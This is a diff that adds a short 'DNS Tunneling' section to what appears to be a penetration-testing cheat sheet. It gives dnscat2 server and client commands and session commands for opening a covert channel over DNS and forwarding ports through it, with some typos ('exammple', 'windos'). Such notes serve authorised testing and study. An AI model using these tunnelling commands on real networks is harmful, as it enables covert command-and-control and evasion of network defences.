@@ -1245,6 +1245,26 @@ netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
 
+##### DNS Tunneling
+On server
+```shell
+dnscat2-server <DNS> # eg exammple.com
+```
+
+On client
+```shell
+dnscat <DNS> # eg example.com
+```
+
+On Server
+```shell
+windows # List windows
+windos -i <NUMBER> # open window with number
+? # list commands
+listen --help # get help for listen command
+listen 127.0.0.1:4455 <LHOST>:<LPORT>
+```
+
 #### Python Webserver
 
 ```shell
